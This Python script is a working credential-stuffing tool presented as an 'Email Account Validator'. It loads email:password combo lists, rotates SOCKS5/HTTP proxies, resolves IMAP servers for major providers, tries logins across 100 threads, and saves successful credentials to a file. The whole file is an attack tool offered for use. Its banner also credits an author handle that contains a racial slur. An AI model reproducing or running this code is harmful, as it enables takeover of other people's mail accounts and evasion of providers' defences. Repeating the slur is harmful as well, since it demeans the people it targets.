# -*- coding: utf-8 -*-
import imaplib
import socket
import threading
import time
import random
from queue import Queue
import socks
import dns.resolver
from datetime import datetime
import os
import sys

# ===== CONFIG =====
THREADS = 100
DELAY = 6
PROXY_FILE = "proxies.txt"
GOOD_FILE = "valid.txt"
BAD_FILE = "invalid.txt"
LOG_FILE = "activity.log"
# ==================

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    PURPLE = '\033[95m'
    END = '\033[0m'

checked = 0
valid = 0
failed = 0
lock = threading.Lock()
q = Queue()
proxy_list = []
proxy_type = ""

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear_screen()
    print(f"""{Colors.CYAN}
 _____ ______   ________  ___  ___               ________  ________  ________  _______   ________   ________      
|\   _ \  _   \|\   __  \|\  \|\  \             |\   __  \|\   ____\|\   ____\|\  ___ \ |\   ____\ |\   ____\     
\ \  \\\__\ \  \ \  \|\  \ \  \ \  \            \ \  \|\  \ \  \___|\ \  \___|\ \   __/|\ \  \___|_\ \  \___|_    
 \ \  \\|__| \  \ \   __  \ \  \ \  \            \ \   __  \ \  \    \ \  \    \ \  \_|/_\ \_____  \\ \_____  \   
  \ \  \    \ \  \ \  \ \  \ \  \ \  \____        \ \  \ \  \ \  \____\ \  \____\ \  \_|\ \|____|\  \\|____|\  \  
   \ \__\    \ \__\ \__\ \__\ \__\ \_______\       \ \__\ \__\ \_______\ \_______\ \_______\____\_\  \ ____\_\  \ 
    \|__|     \|__|\|__|\|__|\|__|\|_______|        \|__|\|__|\|_______|\|_______|\|_______|\_________\\_________\
                                                                                            \|_________\|_________|                                         
 {Colors.PURPLE}╔═══════════════════════════════════════════╗
 ║          Email Account Validator          ║
 ║      With Proxy Support & Multi-Threading ║
 ║        By @residential_nigga              ║
 ╚═══════════════════════════════════════════╝{Colors.END}""")

def safe_input(prompt):
    """Robust input handling that works even when stdin is closed"""
    try:
        if sys.stdin and sys.stdin.isatty():
            return input(prompt)
    except (RuntimeError, EOFError, OSError):
        pass
    
    try:
        if os.name == 'nt':
            with open('CONIN$', 'r') as con:
                print(prompt, end='', flush=True)
                return con.readline().strip()
    except:
        pass
    
    print(f"{prompt} [Press Enter in console window]")
    time.sleep(5)
    return ""

def load_file(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        try:
            with open(filename, 'r', encoding='latin-1') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to read {filename}: {str(e)}{Colors.END}")
            return []

def get_proxy_type():
    while True:
        print(f"\n{Colors.BLUE}Select proxy type:{Colors.END}")
        print(f"{Colors.CYAN}1) SOCKS5")
        print(f"2) HTTP/HTTPS{Colors.END}")
        choice = safe_input(f"{Colors.YELLOW}>>> Enter choice (1/2): {Colors.END}").strip()
        if choice == "1":
            return "SOCKS5"
        elif choice == "2":
            return "HTTP"
        elif not choice:
            return None
        else:
            print(f"{Colors.RED}[!] Invalid choice. Try again.{Colors.END}")

def load_proxies():
    global proxy_type
    if not os.path.exists(PROXY_FILE):
        print(f"{Colors.YELLOW}[!] No proxy file found. Continuing without proxies.{Colors.END}")
        return
        
    proxy_type = get_proxy_type()
    if proxy_type is None:
        return
        
    proxy_list.clear()
    lines = load_file(PROXY_FILE)
    for line in lines:
        try:
            parts = line.split(":")
            if len(parts) >= 2:
                proxy_list.append({
                    "type": proxy_type,
                    "ip": parts[0],
                    "port": int(parts[1]),
                    "user": parts[2] if len(parts) > 2 else None,
                    "pass": parts[3] if len(parts) > 3 else None
                })
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Bad proxy line: {line} | Error: {e}{Colors.END}")

def get_random_proxy():
    return random.choice(proxy_list) if proxy_list else None

def setup_proxy(proxy):
    if proxy and proxy["type"] == "SOCKS5":
        socks.set_default_proxy(
            socks.SOCKS5,
            proxy["ip"],
            proxy["port"],
            username=proxy["user"],
            password=proxy["pass"]
        )
        socket.socket = socks.socksocket

def reset_socket():
    socks.set_default_proxy()
    socket.socket = socket.socket

def log_activity(message, status):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    
    with lock:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_entry + "\n")
        
        global checked, valid, failed
        checked += 1
        if status == "HIT":
            valid += 1
            with open(GOOD_FILE, "a", encoding="utf-8") as f:
                f.write(message.split(" ")[1] + "\n")
        elif status == "FAIL":
            failed += 1
            with open(BAD_FILE, "a", encoding="utf-8") as f:
                f.write(message.split(" ")[1] + "\n")
        
        color = Colors.GREEN if status == "HIT" else Colors.RED if status == "FAIL" else Colors.YELLOW
        print(f"{color}{log_entry}{Colors.END}")
        print(f"{Colors.BLUE}[STATS] Checked: {checked} | Valid: {valid} | Failed: {failed}{Colors.END}", end="\r")

def get_imap_server(email):
    domain = email.split("@")[-1].lower()
    common_servers = {
        "gmail.com": "imap.gmail.com",
        "yahoo.com": "imap.mail.yahoo.com",
        "outlook.com": "imap-mail.outlook.com",
        "hotmail.com": "imap-mail.outlook.com",
        "aol.com": "imap.aol.com",
        "icloud.com": "imap.mail.me.com"
    }
    if domain in common_servers:
        return common_servers[domain]
    try:
        mx_records = dns.resolver.resolve(domain, "MX")
        mx_host = str(mx_records[0].exchange).lower()
        if mx_host.startswith("mail."):
            return mx_host.replace("mail.", "imap.", 1)
        elif "google" in mx_host:
            return "imap.gmail.com"
        return f"imap.{domain}"
    except:
        return f"imap.{domain}"

def check_account(email, password, proxy=None):
    server = get_imap_server(email)
    try:
        if proxy and proxy["type"] == "HTTP":
            conn = imaplib.IMAP4_SSL(server, timeout=15)
            conn.sock = socks.create_connection(
                (server, 993),
                proxy_type="HTTP",
                proxy_addr=proxy["ip"],
                proxy_port=proxy["port"],
                proxy_username=proxy["user"],
                proxy_password=proxy["pass"]
            )
        else:
            conn = imaplib.IMAP4_SSL(server, timeout=15)

        conn.login(email, password)
        conn.logout()
        log_activity(f"HIT: {email}:{password} | Server: {server}", "HIT")
    except Exception as e:
        log_activity(f"FAIL: {email}:{password} | Error: {str(e)}", "FAIL")
    finally:
        if 'conn' in locals():
            try:
                conn.logout()
            except:
                pass
        if proxy and proxy["type"] == "SOCKS5":
            reset_socket()

def worker():
    while not q.empty():
        email, password = q.get()
        proxy = get_random_proxy()
        if proxy:
            setup_proxy(proxy)
        check_account(email, password, proxy)
        time.sleep(DELAY)
        q.task_done()

def get_accounts_file():
    while True:
        file_path = safe_input(f"{Colors.YELLOW}>>> Enter path to accounts file email:pass (or drag file here): {Colors.END}").strip('"')
        if not file_path:
            file_path = "accounts.txt"
            
        try:
            with open(file_path, 'r') as test:
                return file_path
        except FileNotFoundError:
            print(f"{Colors.RED}[!] File not found. Try again.{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {str(e)}{Colors.END}")

def safe_exit(message=""):
    if message:
        print(message)
    try:
        if os.name == 'nt':
            os.system("pause")
        else:
            print("Press Enter to exit...")
            sys.stdin.read(1)
    except:
        pass
    sys.exit(0)

def main():
    try:
        show_banner()
        
        if os.path.exists("accounts.txt"):
            use_default = safe_input(f"{Colors.YELLOW}>>> Found accounts.txt in current directory. Use it? (Y/n): {Colors.END}").strip().lower()
            if use_default in ('y', ''):
                accounts_file = "accounts.txt"
            else:
                accounts_file = get_accounts_file()
        else:
            accounts_file = get_accounts_file()
        
        print(f"{Colors.BLUE}[!] Loading proxies...{Colors.END}")
        load_proxies()
        
        accounts = []
        lines = load_file(accounts_file)
        for line in lines:
            if ":" in line:
                try:
                    email, password = line.split(":", 1)
                    accounts.append((email.strip(), password.strip()))
                except:
                    print(f"{Colors.YELLOW}[!] Skipping malformed line: {line}{Colors.END}")

        if not accounts:
            safe_exit(f"{Colors.RED}[!] No valid accounts found!{Colors.END}")

        for email, password in accounts:
            q.put((email, password))

        print(f"\n{Colors.PURPLE}╔══════════════════════════════════════════╗")
        print(f"║ {Colors.CYAN}Starting {len(accounts)} checks with {THREADS} threads!{Colors.PURPLE} ║")
        print(f"╚══════════════════════════════════════════╝{Colors.END}")
        
        for _ in range(THREADS):
            threading.Thread(target=worker, daemon=True).start()

        q.join()
        print(f"\n{Colors.PURPLE}╔══════════════════════════════════════════╗")
        print(f"║ {Colors.CYAN}Final Stats: Checked: {checked} | Valid: {valid} | Failed: {failed}{Colors.PURPLE} ║")
        print(f"╚══════════════════════════════════════════╝{Colors.END}")
        
        safe_exit()
        
    except KeyboardInterrupt:
        safe_exit(f"\n{Colors.RED}[!] Script stopped by user.{Colors.END}")
    except Exception as e:
        safe_exit(f"\n{Colors.RED}[!] Critical error: {str(e)}{Colors.END}")

if __name__ == "__main__":
    main()